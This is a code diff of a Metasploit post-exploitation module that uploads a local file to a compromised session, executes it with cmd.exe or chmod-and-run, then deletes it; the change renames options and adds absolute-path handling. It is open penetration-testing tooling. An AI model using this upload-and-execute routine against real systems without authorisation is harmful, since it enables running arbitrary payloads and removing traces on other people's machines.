@@ -18,34 +18,43 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptPath.new('LFILE', [true,'Local file to upload and execute']),
-        OptString.new('RFILE', [false,'Name of file on target (default is basename of LFILE)']),
+        OptPath.new('LPATH', [true,'Local file path to upload and execute']),
+        OptString.new('RPATH', [false,'Remote file path on target (default is basename of LPATH)']),
       ])
   end
 
-  def rfile
-    if datastore['RFILE'].blank?
-      remote_name = File.basename(datastore['LFILE'])
+  def rpath
+    if datastore['RPATH'].blank?
+      remote_name = File.basename(datastore['LPATH'])
     else
-      remote_name = datastore['RFILE']
+      remote_name = datastore['RPATH']
     end
 
     remote_name
   end
 
-  def lfile
-    datastore['LFILE']
+  def lpath
+    datastore['LPATH']
   end
 
   def run
-    upload_file(rfile, lfile)
+    upload_file(rpath, lpath)
 
     if session.platform.include?("windows")
-      cmd_exec("cmd.exe /c start #{rfile}", nil, 0)
+      cmd_exec("cmd.exe /c start #{rpath}", nil, 0)
     else
-      cmd_exec("chmod 755 #{rfile} && ./#{rfile}", nil, 0)
+      cmd = "chmod 700 #{rpath} && "
+
+      # Handle absolute paths
+      if rpath.start_with?('/')
+        cmd << rpath
+      else
+        cmd << "./#{rpath}"
+      end
+
+      cmd_exec(cmd, nil, 0)
     end
-    rm_f(rfile)
+
+    rm_f(rpath)
   end
 end
-
